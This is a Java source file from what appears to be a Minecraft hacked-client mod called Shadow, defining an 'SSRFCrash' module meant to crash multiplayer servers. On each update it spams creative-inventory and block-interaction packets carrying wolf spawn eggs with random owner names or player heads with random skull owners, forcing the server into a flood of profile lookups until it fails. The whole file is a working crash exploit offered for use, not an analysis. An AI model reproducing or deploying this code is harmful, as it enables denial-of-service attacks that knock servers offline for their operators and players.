package net.shadow.feature.module;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.MultiValue;

import java.util.Random;

public class ForceRequestsModule extends Module {

    final MultiValue mode = this.config.create("Mode", "Wolf", "Wolf", "Skull");

    public ForceRequestsModule() {
        super("SSRFCrash", "crash by making the server send web requests", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        if(mode.getThis().equals("Wolf")){
            for (int i = 0; i < 3; i++) {
                ItemStack krash = new ItemStack(Items.WOLF_SPAWN_EGG, 1);
                NbtCompound kompound = new NbtCompound();
                NbtCompound kompound2 = new NbtCompound();
                NbtList effects = new NbtList();
                NbtCompound invis = new NbtCompound();
                NbtCompound damage = new NbtCompound();
                damage.put("Id", NbtByte.of((byte) 7));
                damage.put("Amplifier", NbtByte.of((byte) 4));
                damage.put("Duration", NbtInt.of(2000));
                invis.put("Id", NbtByte.of((byte) 14));
                invis.put("Amplifier", NbtByte.of((byte) 4));
                invis.put("Duration", NbtInt.of(2000));
                effects.add(damage);
                effects.add(invis);
                kompound2.put("ActiveEffects", effects);
                kompound2.put("Owner", NbtString.of(rndStr(15)));
                kompound2.put("Tamed", NbtByte.of(true));
                kompound.put("EntityTag", kompound2);
                krash.setNbt(kompound);
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, krash));
                try {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0, 0, 0), Direction.UP, Shadow.c.player.getBlockPos(), true)));
                } catch (Exception ignored) {
                }
            }
        }else{
            for(int i = 0 ; i < 2; i++){
                ItemStack krash = new ItemStack(Items.PLAYER_HEAD, 1);
                NbtCompound kompound = new NbtCompound();
                kompound.put("SkullOwner", NbtString.of(rndStr(12)));
                krash.setNbt(kompound);
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, krash));
                kompound = new NbtCompound();
                kompound.put("SkullOwner", NbtString.of(rndStr(12)));
                krash.setNbt(kompound);
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(45, krash));
            }
        }
    }

    @Override
    public void onRender() {

    }

    private String rndStr(int size) {
        StringBuilder buf = new StringBuilder();
        String[] chars = new String[]{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"};
        Random r = new Random();
        for (int i = 0; i < size; i++) {
            buf.append(chars[r.nextInt(chars.length)]);
        }
        return buf.toString();
    }
}
